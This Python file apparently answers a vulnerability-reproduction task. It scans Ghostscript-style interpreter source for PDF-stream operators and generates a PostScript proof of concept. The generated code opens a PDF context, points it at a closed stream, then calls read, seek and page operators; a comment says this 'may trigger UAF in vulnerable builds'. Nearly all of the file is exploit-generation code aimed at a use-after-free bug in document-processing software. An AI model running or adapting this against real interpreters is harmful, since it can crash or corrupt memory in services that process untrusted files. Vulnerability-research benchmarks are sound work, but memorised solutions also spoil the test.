import os
import re
import tarfile
from dataclasses import dataclass
from typing import Dict, List, Optional, Tuple


@dataclass(frozen=True)
class OpDef:
    name: str
    argc: int
    func: str
    score: int


class Solution:
    def __init__(self) -> None:
        self._opdef_re = re.compile(r'\{\s*"([^"]+)"\s*,\s*([A-Za-z_][A-Za-z0-9_]*)\s*\}')
        self._func_def_re_cache: Dict[str, re.Pattern] = {}

    def _iter_source_files(self, src_path: str):
        if os.path.isdir(src_path):
            for root, _, files in os.walk(src_path):
                for fn in files:
                    lfn = fn.lower()
                    if not (lfn.endswith((".c", ".h", ".ps", ".cpp", ".cc"))):
                        continue
                    full = os.path.join(root, fn)
                    yield full, None
            return

        # tarball
        with tarfile.open(src_path, "r:*") as tf:
            for m in tf.getmembers():
                if not m.isreg():
                    continue
                name = m.name
                lname = name.lower()
                if not (lname.endswith((".c", ".h", ".ps", ".cpp", ".cc"))):
                    continue
                # Focus on likely relevant files
                if not any(x in lname for x in ("pdf", "ps", "interp", "ghost", "z")):
                    continue
                if m.size <= 0 or m.size > 5_000_000:
                    continue
                yield name, (tf, m)

    def _read_text(self, path_or_name: str, tar_ctx) -> str:
        try:
            if tar_ctx is None:
                with open(path_or_name, "rb") as f:
                    data = f.read()
            else:
                tf, m = tar_ctx
                f = tf.extractfile(m)
                if f is None:
                    return ""
                data = f.read()
            return data.decode("latin1", errors="ignore")
        except Exception:
            return ""

    def _safe_ps_string(self, s: str) -> str:
        s = s.replace("\\", "\\\\").replace("(", "\\(").replace(")", "\\)")
        return s

    def _make_min_pdf(self) -> bytes:
        # Minimal, well-formed PDF with xref
        lines: List[bytes] = []
        def add(x: str) -> None:
            lines.append(x.encode("ascii"))

        add("%PDF-1.4\n")
        # Objects
        obj1 = "1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
        obj2 = "2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
        obj3 = "3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 10 10] /Contents 4 0 R /Resources << >> >>\nendobj\n"
        obj4 = "4 0 obj\n<< /Length 0 >>\nstream\n\nendstream\nendobj\n"

        body_parts = [obj1, obj2, obj3, obj4]

        offsets = [0]  # xref entry 0
        cur = sum(len(x) for x in lines)
        for part in body_parts:
            offsets.append(cur)
            cur += len(part.encode("ascii"))
        for part in body_parts:
            add(part)

        xref_pos = sum(len(x) for x in lines)
        add("xref\n")
        add("0 5\n")
        add("0000000000 65535 f \n")
        for off in offsets[1:]:
            add(f"{off:010d} 00000 n \n")

        add("trailer\n")
        add("<< /Size 5 /Root 1 0 R >>\n")
        add("startxref\n")
        add(f"{xref_pos}\n")
        add("%%EOF\n")
        return b"".join(lines)

    def _ps_exec_op(self, opname: str) -> str:
        # If name is a safe PS token, emit directly; else use (name) cvn load exec
        if re.fullmatch(r"[A-Za-z_.][A-Za-z0-9_.@$-]*", opname or ""):
            return opname
        return f"({self._safe_ps_string(opname)}) cvn load exec"

    def _score_op(self, opname: str, func: str, text_hint: str) -> int:
        n = (opname or "").lower()
        f = (func or "").lower()
        s = 0
        if "pdfi" in n or "pdfi" in f:
            s += 60
        if "runpdfbegin" in n or "runpdfbegin" in f:
            s += 50
        if "pdfopen" in n or "pdfopen" in f:
            s += 45
        if "istream" in n or "istream" in f:
            s += 80
        if "input" in n or "input" in f:
            s += 30
        if "stream" in n or "stream" in f:
            s += 25
        if "set" in n or "set" in f:
            s += 25
        if "read" in n or "read" in f:
            s += 20
        if "seek" in n or "seek" in f:
            s += 20
        if "xref" in n or "xref" in f:
            s += 20
        if "page" in n or "page" in f:
            s += 15
        if "close" in n or "close" in f:
            s -= 10
        if text_hint:
            th = text_hint.lower()
            if "input_stream" in th:
                s += 60
            if "istream" in th:
                s += 30
            if "stream" in th and ("read" in th or "seek" in th):
                s += 20
        return s

    def _extract_opdefs(self, texts: List[Tuple[str, str]]) -> Tuple[List[OpDef], Dict[str, str]]:
        # returns opdefs, func_snippets
        op_entries: List[Tuple[str, int, str]] = []
        func_to_filetext: Dict[str, str] = {}
        for _, txt in texts:
            for m in self._opdef_re.finditer(txt):
                raw = m.group(1)
                func = m.group(2)
                mm = re.match(r"(\d+)(.*)$", raw)
                if not mm:
                    continue
                try:
                    argc = int(mm.group(1))
                except Exception:
                    continue
                name = mm.group(2)
                if not name:
                    continue
                op_entries.append((name, argc, func))
                if func not in func_to_filetext:
                    func_to_filetext[func] = txt

        # Extract small snippet around function definition when available
        func_snippet: Dict[str, str] = {}
        for func, txt in func_to_filetext.items():
            if func not in self._func_def_re_cache:
                self._func_def_re_cache[func] = re.compile(
                    r"(?:^|\n)\s*(?:static\s+)?int\s+%s\s*\(\s*i_ctx_t\s*\*\s*i_ctx_p\s*\)\s*\{" % re.escape(func)
                )
            m = self._func_def_re_cache[func].search(txt)
            if not m:
                continue
            start = m.end()
            # crude snippet
            func_snippet[func] = txt[start:start + 2500]

        opdefs: List[OpDef] = []
        for name, argc, func in op_entries:
            snippet = func_snippet.get(func, "")
            score = self._score_op(name, func, snippet)
            opdefs.append(OpDef(name=name, argc=argc, func=func, score=score))

        # Deduplicate by (name, argc), keep best score
        best: Dict[Tuple[str, int], OpDef] = {}
        for o in opdefs:
            k = (o.name, o.argc)
            if k not in best or o.score > best[k].score:
                best[k] = o
        return list(best.values()), func_snippet

    def solve(self, src_path: str) -> bytes:
        texts: List[Tuple[str, str]] = []
        for p, tar_ctx in self._iter_source_files(src_path):
            txt = self._read_text(p, tar_ctx)
            if not txt:
                continue
            l = p.lower()
            if any(x in l for x in ("pdf", "zpdf", "pdfi", "runpdf", "stream", "operator", "op_def", "interp", "ghost")):
                texts.append((p, txt))
            elif len(texts) < 50:
                # allow some extra
                texts.append((p, txt))
            if len(texts) >= 250:
                break

        opdefs, _ = self._extract_opdefs(texts)

        def pick_ops(pred, limit: int) -> List[OpDef]:
            arr = [o for o in opdefs if pred(o)]
            arr.sort(key=lambda x: x.score, reverse=True)
            # unique by name preferred
            seen = set()
            out = []
            for o in arr:
                if o.name in seen:
                    continue
                seen.add(o.name)
                out.append(o)
                if len(out) >= limit:
                    break
            return out

        def is_setstream(o: OpDef) -> bool:
            n = o.name.lower()
            f = o.func.lower()
            if "set" not in n and "set" not in f:
                return False
            if not (("pdf" in n) or ("pdf" in f) or ("pdfi" in n) or ("pdfi" in f)):
                return False
            if ("istream" in n) or ("istream" in f):
                return True
            if ("input" in n or "input" in f) and ("stream" in n or "stream" in f or "file" in n or "file" in f):
                return True
            if ("stream" in n or "stream" in f) and ("pdfi" in n or "pdfi" in f):
                return True
            return False

        def is_open(o: OpDef) -> bool:
            n = o.name.lower()
            f = o.func.lower()
            if "runpdfbegin" in n or "runpdfbegin" in f:
                return True
            if "pdfopen" in n or "pdfopen" in f:
                return True
            if ("open" in n or "open" in f) and ("pdf" in n or "pdf" in f or "pdfi" in n or "pdfi" in f):
                return True
            if ("new" in n or "create" in n or "alloc" in f) and ("pdfi" in f or "pdfi" in n):
                return True
            return False

        def is_use(o: OpDef) -> bool:
            n = o.name.lower()
            f = o.func.lower()
            if "pdf" not in n and "pdf" not in f and "pdfi" not in n and "pdfi" not in f:
                return False
            if any(k in n for k in ("set", "open", "begin", "close", "end", "init", "create")):
                return False
            if o.argc > 3:
                return False
            if any(k in n for k in ("read", "seek", "xref", "page", "token", "parse", "next", "obj", "scan", "stream")):
                return True
            if "stream" in f:
                return True
            return False

        open_ops = pick_ops(is_open, 8)
        set_ops = pick_ops(is_setstream, 12)
        use_ops = pick_ops(is_use, 18)

        # Fallbacks (in case scanning fails)
        if not any(o.name == ".runpdfbegin" for o in open_ops):
            open_ops = [OpDef(".runpdfbegin", 1, ".runpdfbegin", 999)] + open_ops
        if not any("setpdf" in o.name.lower() or "istream" in o.name.lower() for o in set_ops):
            set_ops = [
                OpDef(".setpdfistream", 2, ".setpdfistream", 999),
                OpDef(".setpdfinput", 2, ".setpdfinput", 800),
            ] + set_ops
        # use fallback
        if not use_ops:
            use_ops = [
                OpDef(".pdfpagecount", 0, ".pdfpagecount", 100),
                OpDef(".pdfreadxref", 0, ".pdfreadxref", 100),
                OpDef(".pdfgetpage", 1, ".pdfgetpage", 100),
            ]

        pdf_bytes = self._make_min_pdf()
        pdf_str = pdf_bytes.decode("latin1", errors="ignore")
        bad_str = "X"

        pdf_str_ps = self._safe_ps_string(pdf_str)
        bad_str_ps = self._safe_ps_string(bad_str)

        # Generate PS code
        out: List[str] = []
        out.append("%!PS-Adobe-3.0\n")
        out.append("userdict begin\n")
        out.append("/TRY { stopped pop } bind def\n")
        out.append("/d0 countdictstack def\n")
        out.append("/ctx null def\n")
        out.append(f"/pdfstr ({pdf_str_ps}) def\n")
        out.append(f"/badstr ({bad_str_ps}) def\n")
        out.append("/mkfile { % (s) -> file\n")
        out.append("  systemdict /.stringfile known { .stringfile } { pop (%stdin) (r) file } ifelse\n")
        out.append("} bind def\n")
        out.append("/F pdfstr mkfile def\n")
        out.append("/B badstr mkfile def\n")
        out.append("{ B closefile } TRY\n")

        # Open attempts
        out.append("% open ctx\n")
        for o in open_ops[:8]:
            op_exec = self._ps_exec_op(o.name)
            if o.argc == 0:
                out.append(f"{{ {op_exec} /ctx exch def }} TRY\n")
            elif o.argc == 1:
                out.append(f"{{ F {op_exec} /ctx exch def }} TRY\n")
                # try within a begin if ctx is dict already
                out.append(f"{{ ctx type /dicttype eq {{ ctx begin F {op_exec} end /ctx exch def }} if }} TRY\n")
            elif o.argc == 2:
                out.append(f"{{ F 0 {op_exec} /ctx exch def }} TRY\n")
                out.append(f"{{ 0 F {op_exec} /ctx exch def }} TRY\n")

        # runpdfbegin PS proc fallback
        out.append("{ /runpdfbegin where { pop F runpdfbegin /ctx currentdict def } if } TRY\n")

        # Set stream attempts (intended to fail)
        out.append("% set stream to closed/invalid to provoke failure\n")
        for o in set_ops[:12]:
            op_exec = self._ps_exec_op(o.name)
            if o.argc == 0:
                out.append(f"{{ {op_exec} }} TRY\n")
                out.append(f"{{ ctx type /dicttype eq {{ ctx begin {op_exec} end }} if }} TRY\n")
            elif o.argc == 1:
                out.append(f"{{ B {op_exec} }} TRY\n")
                out.append(f"{{ ctx {op_exec} }} TRY\n")
                out.append(f"{{ ctx type /dicttype eq {{ ctx begin B {op_exec} end }} if }} TRY\n")
            elif o.argc == 2:
                out.append(f"{{ ctx B {op_exec} }} TRY\n")
                out.append(f"{{ B ctx {op_exec} }} TRY\n")
                out.append(f"{{ ctx type /dicttype eq {{ ctx begin B {op_exec} end }} if }} TRY\n")
                out.append(f"{{ ctx type /dicttype eq {{ ctx begin ctx B {op_exec} end }} if }} TRY\n")
            elif o.argc == 3:
                out.append(f"{{ ctx B 0 {op_exec} }} TRY\n")
                out.append(f"{{ B ctx 0 {op_exec} }} TRY\n")
                out.append(f"{{ 0 ctx B {op_exec} }} TRY\n")
                out.append(f"{{ ctx type /dicttype eq {{ ctx begin B 0 {op_exec} end }} if }} TRY\n")

        # Use attempts (after failure)
        out.append("% use ops (may trigger UAF in vulnerable builds)\n")
        for o in use_ops[:18]:
            op_exec = self._ps_exec_op(o.name)
            if o.argc == 0:
                out.append(f"{{ {op_exec} }} TRY\n")
                out.append(f"{{ ctx type /dicttype eq {{ ctx begin {op_exec} end }} if }} TRY\n")
            elif o.argc == 1:
                out.append(f"{{ ctx {op_exec} }} TRY\n")
                out.append(f"{{ 0 {op_exec} }} TRY\n")
                out.append(f"{{ F {op_exec} }} TRY\n")
                out.append(f"{{ ctx type /dicttype eq {{ ctx begin {op_exec} end }} if }} TRY\n")
            elif o.argc == 2:
                out.append(f"{{ ctx 0 {op_exec} }} TRY\n")
                out.append(f"{{ 0 ctx {op_exec} }} TRY\n")
                out.append(f"{{ ctx F {op_exec} }} TRY\n")
                out.append(f"{{ F ctx {op_exec} }} TRY\n")
                out.append(f"{{ ctx type /dicttype eq {{ ctx begin 0 {op_exec} end }} if }} TRY\n")
            elif o.argc == 3:
                out.append(f"{{ ctx 0 0 {op_exec} }} TRY\n")
                out.append(f"{{ 0 ctx 0 {op_exec} }} TRY\n")
                out.append(f"{{ 0 0 ctx {op_exec} }} TRY\n")
                out.append(f"{{ ctx F 0 {op_exec} }} TRY\n")
                out.append(f"{{ ctx type /dicttype eq {{ ctx begin 0 0 {op_exec} end }} if }} TRY\n")

        # High-level PS procedures if ctx is a dict
        out.append("% high-level procedures (if available)\n")
        out.append("{ ctx type /dicttype eq { ctx begin { pdfpagecount pop } TRY { 0 pdfgetpage pop } TRY end } if } TRY\n")

        # Restore dict stack and quit
        out.append("{ countdictstack d0 gt { end } { exit } ifelse } loop\n")
        out.append("quit\n")
        out.append("end\n")

        return "".join(out).encode("latin1", errors="ignore")